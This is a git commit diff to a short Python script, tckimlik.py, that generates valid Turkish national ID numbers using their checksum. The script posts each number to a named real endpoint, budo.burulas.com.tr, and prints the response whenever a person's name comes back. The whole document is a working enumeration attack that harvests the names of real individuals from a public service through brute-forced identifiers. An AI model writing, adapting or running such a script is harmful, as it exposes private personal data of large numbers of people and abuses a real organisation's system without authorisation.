f80eddf7127b6dd5c620819d5371d9f139ef0aa3
Can Bülbül <alicanblbl@gmail.com>
2015-04-24 21:18:57 +0300

    checksum optimizasyonu

--- tckimlik.py
+++ tckimlik.py
@@ -2,15 +2,20 @@ import requests
 import uuid
 
 def go():
-    for i in range(10000000000, 99999999999):
+    for i in range(100000000, 999999999):
+        digits = list(map(int,str(i)))
+        s0 = (sum(digits[::2])*7 - sum(digits[1::2])) %10
+        s1 = (sum(digits[:9])+s0) %10
+        tck = i*100+s0*10+s1
+        print(tck)
         r = requests.post("https://budo.burulas.com.tr/tr/Dynamic/TcRequest", {
-            "tcIdentity": i,
+            "tcIdentity": tck,
             "ticketCategory": str(uuid.uuid4())
         })
         if r.status_code == 200:
             rdata = r.json()
             if rdata.get("Name"):
-                print r.text
+                print(r.text)
 
 if __name__ == "__main__":
     go()
